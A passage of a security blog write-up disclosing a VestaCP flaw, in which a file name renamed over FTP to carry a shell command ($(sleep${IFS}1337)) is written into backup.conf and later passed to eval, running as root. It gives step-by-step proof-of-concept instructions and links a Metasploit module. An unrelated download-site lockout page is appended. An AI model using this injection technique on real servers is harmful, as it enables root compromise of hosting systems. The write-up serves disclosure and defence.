echo "$BIN/v-backup-user $user yes >> $log 2>&1" >>\
    $VESTA/data/queue/backup.pipe

# Logging
log_event "$OK" "$ARGUMENTS"

exit

```

Nothing interesting so far. We can NOT even control **user** variable, since it‚Äôs coming from session. But **v-schedule-user-backup** is executing **v-backup-user** file. Let‚Äôs keep reading. That bash scripts does what it says, it gathers all the data related to our user and compress it as a tar.gz file.

That bash script has 945 line of code. For that reason, I‚Äôm only showing important parts.

Following code section is taken lines between 900-920 from **v-backup-user** file. It writes multiple variable into the backup.conf file (that‚Äôll be very important later!)

```
# Registering new backup
backup_str="BACKUP='$user.$backup_new_date.tar'"
backup_str="$backup_str TYPE='$BACKUP_SYSTEM' SIZE='$size'"
backup_str="$backup_str WEB='${web_list// /,}'"
backup_str="$backup_str DNS='${dns_list// /,}'"
backup_str="$backup_str MAIL='${mail_list// /,}'"
backup_str="$backup_str DB='${db_list// /,}'"
backup_str="$backup_str CRON='$cron_list'"
backup_str="$backup_str UDIR='${udir_list// /,}'"
backup_str="$backup_str RUNTIME='$run_time' TIME='$time' DATE='$date'"
echo "$backup_str" >> $USER_DATA/backup.conf
```

One of the variable is 9. line **udir\_list** , which is being populated by following code section around line 400-450 in the code base.

```
    for udir in $(ls -a |egrep -v "^conf$|^web$|^dns$|^mail$|^\.\.$|^\.$"); do
        exclusion=$(echo "$USER" |tr ',' '\n' |grep "^$udir$")
        if [ -z "$exclusion" ]; then
            ((i ++))
            udir_list="$udir_list $udir"
            echo -e "$(date "+%F %T") adding $udir" |tee -a $BACKUP/$user.log

            # Backup files and dirs
            tar --anchored -cpf- ${fargs[@]} $udir |gzip -$BACKUP_GZIP - > $tmpdir/user_dir/$udir.tar.gz
        fi
    done
```

It basically works as follow in order:
‚Äì¬†¬†¬†¬†¬†¬† Get speficis folder names and files start with dots.
‚Äì¬†¬†¬†¬†¬†¬† Compress them into the backup file.
‚Äì¬†¬†¬†¬†¬†¬† Replace spaces within the file and/or folder names in case of whitespace. (that‚Äôll be important too)

In the end you will have your tar backup file on your user‚Äôs folder. Please keep that information in your mind, we‚Äôll come back here later ! Now let‚Äôs see what‚Äôs happening when your list existing backup file via web panel.

**Listing Existing Backup**

Following URL can be used to list current backups. [https://URL:8083/list/backup/](https://192.168.74.218:8083/list/backup/)

```
    exec (VESTA_CMD."v-list-user-backup $user ".escapeshellarg($_GET['backup'])." json", $output, $return_var);
    $data = json_decode(implode('', $output), true);
    $data = array_reverse($data,true);
    unset($output);
```

That endpoint will execute **v-list-user-backups** bash script file with **user**, **backup** and **json** variables retrieves some information about user‚Äôs backup and shows them on web ui.

![](https://pentest.blog/wp-content/uploads/vestacp-2.png)

Let‚Äôs have a look at v-list-user-backup implementation. Please keep that in your mind, we are interested with json output.

```
json_list() {
    IFS=$'\n'
    i=1
    objects=$(grep BACKUP $USER_DATA/backup.conf |wc -l)
    echo "{"
    while read str; do
        eval $str
        echo -n '    "'$BACKUP'": {
        "TYPE": "'$TYPE'",
        "SIZE": "'$SIZE'",
        "WEB": "'$WEB'",
        "DNS": "'$DNS'",
        "MAIL": "'$MAIL'",
        "DB": "'$DB'",
        "CRON": "'$CRON'",
        "UDIR": "'$UDIR'",
        "RUNTIME": "'$RUNTIME'",
        "TIME": "'$TIME'",
        "DATE": "'$DATE'"
    }'
        if [ "$i" -lt "$objects" ]; then
            echo ','
        else
            echo
        fi
        ((i++))
    done < <(cat $USER_DATA/backup.conf)
    echo '}'
}
```

Allright, that‚Äôs interesting : ) Content of the user‚Äôs backup.conf file read and string is being passed to the eval J It‚Äôs time to remember first stage of that report, backup.conf is being created with multiple parameter (remember udir\_list)

```
root@mincelocal:~# cat /usr/local/vesta/data/users/user01/backup.conf

BACKUP='user01.2020-03-13_13-40-01.tar' TYPE='local' SIZE='1' WEB='' DNS='' MAIL='' DB='' CRON='' UDIR='.bash_logout,.bashrc,.profile,tmp' RUNTIME='1' TIME='13:40:01' DATE='2020-03-13'

root@mincelocal:~#
```

Here is the content of the backup.conf file. All the files starts with dot is in the UDIR definiton with single quotes and thanks to best operating system ever Linux, we can use single quotes in the files name üôÇ We can connect our user‚Äôs homefolder with FTP and renamed .bash\_logout file with something **.bash\_logout‚Äô;$(PAYLOAD);‚Äô** will be our payload.

#### PoC

1 ‚Äì User login to the FTP

2 ‚Äì Renamed the¬†.bash\_logout with **bash\_logout‚Äô;$(sleep${IFS}1337);‚Äô** ! white-space will break the payload. Remember sed command on the previouse section!

![](https://pentest.blog/wp-content/uploads/vestacp-3-1.png)

3 ‚Äì User login to the web application.

4 ‚Äì Trigger the backup process.

5 ‚Äì When the backup process finished, wait like 3-4 minutes, Here is the content of the backup.conf with implanted payload.

```
root@mincelocal:~# cat /usr/local/vesta/data/users/user01/backup.conf

BACKUP='user01.2020-03-13_13-40-01.tar' TYPE='local' SIZE='1' WEB='' DNS='' MAIL='' DB='' CRON='' UDIR='.bash_logout';$(sleep${IFS}1337);',.bashrc,.profile,tmp' RUNTIME='1' TIME='13:40:01' DATE='2020-03-13'
```

6 ‚Äì Go to¬†<https://192.168.74.218:8083/list/backup/>endpoint where we trigger the v-list-user-backup bash script execution. v-list-user-backup will read the content of the backup.conf file which contains our payload in the filename changed via FTP on step 2.

7 ‚Äì eval is being called.

8 ‚Äì Thanks to the first vulnerability, that command will be executed as a root !

![](https://pentest.blog/wp-content/uploads/vestacp-4.png)
### Exploitation

Ofcourse executing a sleep command with root privileges is not enough ! Here is the Metasploit module in action fellers !

One of the major problem about exploitation is that we have length limitation on file name üôÇ Also space within the file name is forbidden because it breaks bash script eval command. So you may want to read Metasploit module‚Äôs source code in order to see how I managed to overcome these problems.

<https://github.com/rapid7/metasploit-framework/pull/13094>

[0day](https://pentest.blog/tag/0day/) [exploit](https://pentest.blog/tag/exploit/) [metasploit](https://pentest.blog/tag/metasploit/)

![](https://secure.gravatar.com/avatar/a02c8481b3d29584e05195893e584b61?s=60&d=monsterid&r=g)

#### [Mehmet Ince](https://pentest.blog/author/mehmet-ince/)

Master Ninja @ Prodaft / INVICTUS Europe.

## Post navigation

 [Advisory | Seagate Central Storage Remote Code Execution 0day](https://pentest.blog/advisory-seagate-central-storage-remote-code-execution/)[Unexpected Journey #7 ‚Äì GravCMS Unauthenticated Arbitrary YAML Write/Update leads to Code Execution (CVE-2021-21425)](https://pentest.blog/unexpected-journey-7-gravcms-unauthenticated-arbitrary-yaml-write-update-leads-to-code-execution/)

Search for:

### PRODAFT Cyber Intelligence and Cyber Security Services

[![](https://pentest.blog/wp-content/uploads/Mg6EYwIk_400x400.jpg)](https://www.invictuseurope.com/)

### Recent Posts

* [Advisory | NetModule Router Software Race Condition Leads to Remote Code Execution](https://pentest.blog/advisory-netmodule-router-software-race-condition-leads-to-remote-code-execution/)
* [Advisory | Roxy-WI Unauthenticated Remote Code Executions CVE-2022-31137](https://pentest.blog/advisory-roxy-wi-unauthenticated-remote-code-executions-cve-2022-31137/)
* [Advisory | GLPI Service Management Software Multiple Vulnerabilities and Remote Code Execution](https://pentest.blog/advisory-glpi-service-management-software-sql-injection-remote-code-execution-and-local-file-inclusion/)
* [LiderAhenk 0day ‚Äì All your PARDUS Clients Belongs To Me (CVE-2021-3825)](https://pentest.blog/liderahenk-0day-all-your-pardus-clients-belongs-to-me/)
* [Pardus 21 Linux Distro ‚Äì Remote Code Execution 0day 2021 CVE-2021-3806](https://pentest.blog/pardus-21-linux-distro-remote-code-execution-0day-2021/)
### Latest Comments

* [Ege Balci](https://github.com/EgeBalci) on [Art of Anti Detection 3 ‚Äì Shellcode Alchemy](https://pentest.blog/art-of-anti-detection-3-shellcode-alchemy/#comment-1244)
* Chase Run Taylor on [Art of Anti Detection 1 ‚Äì Introduction to AV & Detection Techniques](https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/#comment-1243)
* [Mehmet ƒ∞nce](http://www.mehmetince.net/) on [Unexpected Journey #4 ‚Äì Escaping from Restricted Shell and Gaining Root Access to SolarWinds Log & Event Manager (SIEM) Product](https://pentest.blog/unexpected-journey-4-escaping-from-restricted-shell-and-gaining-root-access-to-solarwinds-log-event-manager-siem-product/#comment-1242)
* 0x00 on [Unexpected Journey #4 ‚Äì Escaping from Restricted Shell and Gaining Root Access to SolarWinds Log & Event Manager (SIEM) Product](https://pentest.blog/unexpected-journey-4-escaping-from-restricted-shell-and-gaining-root-access-to-solarwinds-log-event-manager-siem-product/#comment-1241)
* [Mehmet ƒ∞nce](http://www.mehmetince.net/) on [Unexpected Journey #4 ‚Äì Escaping from Restricted Shell and Gaining Root Access to SolarWinds Log & Event Manager (SIEM) Product](https://pentest.blog/unexpected-journey-4-escaping-from-restricted-shell-and-gaining-root-access-to-solarwinds-log-event-manager-siem-product/#comment-1240)
### Tags

[0day](https://pentest.blog/tag/0day/)
[1day](https://pentest.blog/tag/1day/)
[advisory](https://pentest.blog/tag/advisory/)
[alienvault](https://pentest.blog/tag/alienvault/)
[android](https://pentest.blog/tag/android/)
[application](https://pentest.blog/tag/application/)
[assembly](https://pentest.blog/tag/assembly/)
[bof](https://pentest.blog/tag/bof/)
[burp](https://pentest.blog/tag/burp/)
[bypass](https://pentest.blog/tag/bypass/)
[crypter](https://pentest.blog/tag/crypter/)
[decoder](https://pentest.blog/tag/decoder/)
[dns](https://pentest.blog/tag/dns/)
[EMET](https://pentest.blog/tag/emet/)
[encoder](https://pentest.blog/tag/encoder/)
[exploit](https://pentest.blog/tag/exploit/)
[hook](https://pentest.blog/tag/hook/)
[iat](https://pentest.blog/tag/iat/)
[icmp](https://pentest.blog/tag/icmp/)
[in-memory](https://pentest.blog/tag/in-memory/)
[IOT](https://pentest.blog/tag/iot/)
[linux](https://pentest.blog/tag/linux/)
[malware](https://pentest.blog/tag/malware/)
[metasploit](https://pentest.blog/tag/metasploit/)
[multi-stage](https://pentest.blog/tag/multi-stage/)
[nas](https://pentest.blog/tag/nas/)
[packer](https://pentest.blog/tag/packer/)
[php](https://pentest.blog/tag/php/)
[ransomware](https://pentest.blog/tag/ransomware/)
[rce](https://pentest.blog/tag/rce/)
[reflective](https://pentest.blog/tag/reflective/)
[research](https://pentest.blog/tag/research/)
[reverse](https://pentest.blog/tag/reverse/)
[reversing](https://pentest.blog/tag/reversing/)
[secure coding](https://pentest.blog/tag/secure-coding/)
[securityonion](https://pentest.blog/tag/securityonion/)
[self-defence](https://pentest.blog/tag/self-defence/)
[shellcode](https://pentest.blog/tag/shellcode/)
[siem](https://pentest.blog/tag/siem/)
[sql injection](https://pentest.blog/tag/sql-injection/)
[sqlmap](https://pentest.blog/tag/sqlmap/)
[stager](https://pentest.blog/tag/stager/)
[storage](https://pentest.blog/tag/storage/)
[tunneling](https://pentest.blog/tag/tunneling/)
[windows](https://pentest.blog/tag/windows/)
### Awarded Top 15 Pentest Blog

[![Pentest Blogs](/wp-content/uploads/pentest_1000px.png)](https://blog.feedspot.com/pentest_blogs/ "Pentest Blogs")

INVICTUS Cyber Security & Intelligence Services | Theme by [Colorlib](http://colorlib.com/) Powered by [WordPress](http://wordpress.org/)



=== Content from packetstormsecurity.com_e2234185_20250119_125944.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

LOCKED OUT‚õî 24 hour lockout initiated

hi. we regret to inform you that a condition has occurred that has resulted in a 24 hour lockout. this occurs when rate limiting controls are exceeded or when someone attempts to hack the system but fails too many times. we wish you luck in your future attempts tomorrow.
